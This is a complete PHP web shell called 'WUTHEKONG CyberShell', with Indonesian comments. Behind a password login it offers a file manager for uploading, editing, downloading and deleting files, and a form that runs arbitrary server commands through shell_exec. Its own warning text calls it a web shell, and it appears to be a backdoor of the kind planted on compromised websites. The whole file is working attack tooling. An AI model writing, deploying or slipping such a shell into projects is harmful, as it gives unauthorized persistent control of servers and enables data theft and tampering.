

<?php
session_start();

// --- Konfigurasi ---
// Ganti dengan hash password yang kuat untuk "kominfo".
// Untuk membuat hash kustom Anda, gunakan: echo password_hash('ganti_dengan_password_anda', PASSWORD_BCRYPT);
$correct_password_hash = '$2a$12$BBaLHa.cGOJZR9697oj3auaNFtGk04W6vbsr8mqV9cwprwoPZM4SW'; // Hashed 'kominfo'
$root_dir = realpath(__DIR__); // Setel direktori root ke lokasi script ini

// --- Fungsi Helper ---
function formatBytes($bytes, $precision = 2) {
    if ($bytes === 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, $precision) . ' ' . $units[$pow];
}

// --- Autentikasi ---
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $correct_password_hash)) {
            $_SESSION['auth'] = true;
            header("Location: ?");
            exit;
        } else {
            $login_error = "Incorrect password.";
        }
    }
    // Tampilkan halaman login jika belum autentikasi
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Manager Login</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Orbitron', sans-serif; background-color: #1a1a2e; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
            .login-container { background-color: #2a2a4a; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0, 255, 255, 0.5); text-align: center; max-width: 400px; width: 90%; }
            .login-container h2 { color: #00ffff; margin-bottom: 25px; }
            .login-container input[type="password"] { width: calc(100% - 20px); padding: 12px; margin-bottom: 15px; border: 1px solid #00ffff; border-radius: 5px; background-color: #3a3a5a; color: #e0e0e0; font-size: 16px; }
            .login-container button { width: 100%; padding: 12px; background-color: #00ffff; color: #1a1a2e; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; transition: background-color 0.3s ease; }
            .login-container button:hover { background-color: #00b3b3; }
            .error { color: #ff0000; margin-top: 10px; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>File Manager Login</h2>
            <?php if (isset($login_error)) echo "<p class='error'>$login_error</p>"; ?>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit; // Berhenti eksekusi di sini jika belum login
}

// --- Logout ---
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// --- Penentuan Path Saat Ini ---
$current_path = isset($_GET['d']) ? $_GET['d'] : $root_dir;
$current_path = realpath($current_path);

// Keamanan: Pastikan path yang diakses berada di dalam root_dir atau sub-direktorinya
if (!$current_path || strpos($current_path, $root_dir) !== 0) {
    $current_path = $root_dir; // Default ke root jika path tidak valid
}

// --- Penanganan Aksi HTTP POST (Upload, Create Folder, Create File, CMD) ---
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) {
        $file_name = basename($_FILES['file']['name']); // Amankan nama file
        $target_file = $current_path . '/' . $file_name;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
            // Success
        } else {
            // Error
        }
    } elseif (isset($_POST['create_folder_name'])) {
        $folder_name = basename($_POST['create_folder_name']); // Amankan nama folder
        $target_folder = $current_path . '/' . $folder_name;
        if (!empty($folder_name) && !file_exists($target_folder)) {
            mkdir($target_folder, 0755, true); // Buat folder dengan izin 0755
        }
    } elseif (isset($_POST['create_file_name'])) {
        $file_name = basename($_POST['create_file_name']); // Amankan nama file
        $target_file = $current_path . '/' . $file_name;
        if (!empty($file_name) && !file_exists($target_file)) {
            file_put_contents($target_file, ''); // Buat file kosong
             // Redirect ke mode edit setelah membuat file
            header("Location: ?d=" . urlencode($current_path) . "&edit=" . urlencode($target_file));
            exit;
        }
    } elseif (isset($_POST['command']) && isset($_POST['cmd'])) {
        chdir($current_path); // Pindah ke direktori saat ini untuk eksekusi perintah
        $command_to_exec = $_POST['command'];
        $command_output = shell_exec($command_to_exec . ' 2>&1'); // Eksekusi perintah, ambil stdout dan stderr
        chdir($root_dir); // Kembali ke root setelah eksekusi
    } elseif (isset($_POST['content']) && isset($_GET['edit'])) { // Simpan file yang diedit
        $edit_filepath = realpath($_GET['edit']);
        if ($edit_filepath && strpos($edit_filepath, $current_path) === 0 && is_file($edit_filepath)) {
            file_put_contents($edit_filepath, $_POST['content']);
        }
    }
    header("Location: ?d=" . urlencode($current_path)); // Redirect untuk mencegah submit ulang form
    exit;
}

// --- Penanganan Aksi HTTP GET (Delete, Download, Edit) ---
if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    // Keamanan: Pastikan yang dihapus berada di dalam path saat ini dan bukan root_dir
    if ($target && strpos($target, $current_path) === 0 && $target !== $root_dir) {
        if (is_file($target)) {
            @unlink($target);
        } elseif (is_dir($target)) {
            // Hanya hapus jika folder kosong, mencegah penghapusan rekursif yang berbahaya
            if (count(scandir($target)) == 2) { // . dan ..
                 @rmdir($target);
            } else {
                 // Folder tidak kosong, bisa tampilkan error atau abaikan
            }
        }
    }
    header("Location: ?d=" . urlencode($current_path));
    exit;
}

if (isset($_GET['download'])) {
    $file_to_download = realpath($_GET['download']);
    if ($file_to_download && strpos($file_to_download, $current_path) === 0 && is_file($file_to_download)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_to_download));
        readfile($file_to_download);
        exit;
    } else {
        header("Location: ?d=" . urlencode($current_path));
        exit;
    }
}

// --- Tampilan Edit File (khusus) ---
if (isset($_GET['edit'])) {
    $edit_filepath = realpath($_GET['edit']);
    $file_content = "";
    // Keamanan: Pastikan file yang diedit berada di dalam path saat ini dan merupakan file
    if ($edit_filepath && strpos($edit_filepath, $current_path) === 0 && is_file($edit_filepath)) {
        $file_content = file_get_contents($edit_filepath);
    } else {
        // File tidak valid atau tidak diizinkan, redirect kembali
        header("Location: ?d=" . urlencode($current_path));
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Edit File: <?php echo htmlspecialchars(basename($edit_filepath)); ?></title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
        <style>
            body { font-family: 'Orbitron', sans-serif; background-color: #1a1a2e; color: #e0e0e0; margin: 0; padding: 0; }
            .header { background-color: #0d0d1e; padding: 15px 20px; border-bottom: 1px solid #00ffff; display: flex; justify-content: space-between; align-items: center; }
            .header a.back-btn { background-color: #5a5a8a; color: #e0e0e0; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; transition: background-color 0.3s ease; }
            .header a.back-btn:hover { background-color: #7a7aa0; }
            .container { padding: 20px; max-width: 1200px; margin: 20px auto; background-color: #2a2a4a; border-radius: 10px; box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
            h2 { color: #00ffff; margin-bottom: 20px; }
            .file-editor { width: 100%; min-height: 400px; background-color: #1f1f3e; border: 1px solid #00ffff; color: #e0e0e0; padding: 15px; border-radius: 5px; font-family: 'Consolas', monospace; font-size: 14px; box-sizing: border-box; resize: vertical; margin-bottom: 15px; }
            .btn { background-color: #5a5a8a; color: #e0e0e0; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; transition: background-color 0.3s ease; }
            .btn:hover { background-color: #7a7aa0; }
            .primary-btn { background-color: #00ffff; color: #1a1a2e; }
            .primary-btn:hover { background-color: #00b3b3; }
        </style>
    </head>
    <body>
        <div class="header">
            <a href="?d=<?php echo urlencode($current_path); ?>" class="btn back-btn"><i class="fas fa-arrow-left"></i> Back to File Manager</a>
        </div>
        <div class="container">
            <h2>Edit: <?php echo htmlspecialchars(basename($edit_filepath)); ?></h2>
            <form method="POST" action="?d=<?php echo urlencode($current_path); ?>&edit=<?php echo urlencode($_GET['edit']); ?>">
                <textarea name="content" rows="20" class="file-editor"><?php echo htmlspecialchars($file_content); ?></textarea><br>
                <button type="submit" class="btn primary-btn"><i class="fas fa-save"></i> Save</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit; // Berhenti eksekusi di sini jika di mode edit
}

// --- Tampilan File Manager Utama ---
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WUTHEKONG CyberShell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* CSS ini di-embed langsung ke HTML untuk kemudahan deployment */
        body { font-family: 'Orbitron', sans-serif; background-color: #1a1a2e; color: #e0e0e0; margin: 0; padding: 0; }
        .header { background-color: #0d0d1e; padding: 15px 20px; border-bottom: 1px solid #00ffff; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #00ffff; font-size: 24px; margin: 0; }
        .header .logout-btn { background-color: #ff0000; color: #fff; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; text-decoration: none; font-size: 14px; transition: background-color 0.3s ease; }
        .header .logout-btn:hover { background-color: #cc0000; }
        .container { padding: 20px; max-width: 1200px; margin: 20px auto; background-color: #2a2a4a; border-radius: 10px; box-shadow: 0 0 20px rgba(0, 255, 255, 0.3); }
        .breadcrumbs { margin-bottom: 20px; font-size: 14px; color: #aaa; }
        .breadcrumbs a { color: #00ffff; text-decoration: none; }
        .breadcrumbs a:hover { text-decoration: underline; }
        .current-path { color: #e0e0e0; font-weight: bold; margin-top: 10px; }
        .forms-container { display: flex; flex-wrap: wrap; gap: 20px; margin-bottom: 30px; justify-content: space-between;}
        .form-section { background-color: #3a3a5a; padding: 15px; border-radius: 8px; flex: 1; min-width: 280px; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
        .form-section h4 { color: #00ffff; margin-top: 0; margin-bottom: 15px; font-size: 16px; }
        .form-section input[type="text"], .form-section input[type="file"], .form-section textarea { width: calc(100% - 10px); padding: 8px; margin-bottom: 10px; border: 1px solid #00ffff; border-radius: 4px; background-color: #4a4a6a; color: #e0e0e0; }
        .form-section input[type="file"] { border: none; padding: 0; margin-top: 5px; }
        .btn { background-color: #5a5a8a; color: #e0e0e0; border: none; padding: 8px 12px; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; transition: background-color 0.3s ease; }
        .btn:hover { background-color: #7a7aa0; }
        .primary-btn { background-color: #00ffff; color: #1a1a2e; }
        .primary-btn:hover { background-color: #00b3b3; }
        .danger-btn { background-color: #ff0000; color: #fff; }
        .danger-btn:hover { background-color: #cc0000; }

        .file-list table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .file-list th, .file-list td { padding: 12px; text-align: left; border-bottom: 1px solid #4a4a6a; }
        .file-list th { background-color: #3a3a5a; color: #00ffff; font-size: 15px; }
        .file-list td { background-color: #2f2f4f; }
        .file-list tr:hover td { background-color: #4a4a6a; }
        .file-list .file-type-icon { margin-right: 8px; color: #00ffff; }
        .file-list .file-name { color: #e0e0e0; text-decoration: none; }
        .file-list .file-name:hover { color: #00ffff; }
        .file-list .actions a { margin-left: 10px; }

        .cmd-output { background-color: #1f1f3e; border: 1px solid #00ffff; color: #00ff00; padding: 15px; border-radius: 5px; font-family: 'Consolas', monospace; white-space: pre-wrap; word-wrap: break-word; font-size: 14px; margin-top: 15px; max-height: 300px; overflow-y: auto;}
        .warning-text { color: red; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>WUTHEKONG CyberShell</h1>
        <a href="?logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Logout</a>
    </div>

    <div class="container">
        <div class="breadcrumbs">
            <?php
            $path_parts = explode('/', trim(substr($current_path, strlen($root_dir)), '/'));
            echo '<a href="?d=' . urlencode($root_dir) . '"><i class="fas fa-home"></i> Root</a>';
            $temp_path = $root_dir;
            foreach ($path_parts as $part) {
                if ($part === '') continue;
                $temp_path .= '/' . $part;
                echo ' &gt; <a href="?d=' . urlencode($temp_path) . '">' . htmlspecialchars($part) . '</a>';
            }
            ?>
        </div>
        <p class="current-path">Current Path: <code><?php echo htmlspecialchars($current_path); ?></code></p>

        <div class="forms-container">
            <div class="form-section">
                <h4><i class="fas fa-upload"></i> Upload File</h4>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="file" required>
                    <button type="submit" class="btn primary-btn"><i class="fas fa-upload"></i> Upload</button>
                </form>
            </div>

            <div class="form-section">
                <h4><i class="fas fa-folder-plus"></i> Create New Folder</h4>
                <form method="POST">
                    <input type="text" name="create_folder_name" placeholder="Folder Name" required>
                    <button type="submit" class="btn primary-btn"><i class="fas fa-folder-plus"></i> Create Folder</button>
                </form>
            </div>

            <div class="form-section">
                <h4><i class="fas fa-file-alt"></i> Create New File</h4>
                <form method="POST">
                    <input type="text" name="create_file_name" placeholder="File Name (e.g., config.txt)" required>
                    <button type="submit" class="btn primary-btn"><i class="fas fa-file-alt"></i> Create File</button>
                </form>
            </div>
        </div>

        <div class="form-section" style="flex-basis: 100%;margin-bottom: 30px">
            <h4><i class="fas fa-terminal"></i> Command Execution (CMD)</h4>
            <p class="warning-text"> HATI-HATI! Ini adalah web shell. Perintah yang Anda jalankan dieksekusi di server. Penggunaan yang tidak tepat dapat merusak sistem atau dieksploitasi.</p>
            <form method="POST">
                <input type="text" name="command" placeholder="Enter command (e.g., ls -la, whoami)" value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" required>
                <button type="submit" name="cmd" class="btn primary-btn"><i class="fas fa-play"></i> Execute Command</button>
            </form>
            <?php if (isset($command_output)) : ?>
                <div class="cmd-output">
                    <strong>Output:</strong><br>
                    <?php echo htmlspecialchars($command_output); ?>
                    <?php if (empty($command_output)) echo "<i>(No output or command failed)</i>"; ?>
                </div>
            <?php endif; ?>
        </div>

        <div class="file-list">
            <h3><i class="fas fa-folder-open"></i> Contents</h3>
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Size</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    // Link to parent directory
                    if ($current_path !== $root_dir) {
                        $parent_path = realpath($current_path . '/..');
                        echo '<tr>';
                        echo '<td><i class="fas fa-folder-open file-type-icon"></i> <a href="?d=' . urlencode($parent_path) . '" class="file-name">.. (Parent Directory)</a></td>';
                        echo '<td>Directory</td>';
                        echo '<td></td>';
                        echo '<td></td>';
                        echo '</tr>';
                    }

                    $files = scandir($current_path);
                    foreach ($files as $f) {
                        if ($f == '.' || $f == '..') continue; // Skip current and parent dir here, handled above

                        $fp = "$current_path/$f";
                        echo '<tr>';
                        echo '<td>';
                        if (is_dir($fp)) {
                            echo '<i class="fas fa-folder file-type-icon"></i> <a href="?d=' . urlencode($fp) . '" class="file-name">' . htmlspecialchars($f) . '</a>';
                            echo '</td>';
                            echo '<td>Directory</td>';
                            echo '<td></td>';
                            echo '<td class="actions">';
                            echo '<a href="javascript:void(0);" onclick="confirmDelete(\'' . urlencode($fp) . '\', \'' . htmlspecialchars($f) . '\')" class="btn danger-btn"><i class="fas fa-trash-alt"></i> Del</a>';
                        } else {
                            echo '<i class="fas fa-file-alt file-type-icon"></i> <a href="?download=' . urlencode($fp) . '" class="file-name">' . htmlspecialchars($f) . '</a>';
                            echo '</td>';
                            echo '<td>File</td>';
                            echo '<td>' . formatBytes(filesize($fp)) . '</td>';
                            echo '<td class="actions">';
                            echo '<a href="?d=' . urlencode($current_path) . '&edit=' . urlencode($fp) . '" class="btn"><i class="fas fa-edit"></i> Edit</a>';
                            echo '<a href="?download=' . urlencode($fp) . '" class="btn"><i class="fas fa-download"></i> Download</a>';
                            echo '<a href="javascript:void(0);" onclick="confirmDelete(\'' . urlencode($fp) . '\', \'' . htmlspecialchars($f) . '\')" class="btn danger-btn"><i class="fas fa-trash-alt"></i> Del</a>';
                        }
                        echo '</td>';
                        echo '</tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        function confirmDelete(filepath, filename) {
            if (confirm('Are you sure you want to delete "' + filename + '"? This action cannot be undone.')) {
                window.location.href = '?d=<?php echo urlencode($current_path); ?>&del=' + filepath;
            }
        }
    </script>
</body>
</html>

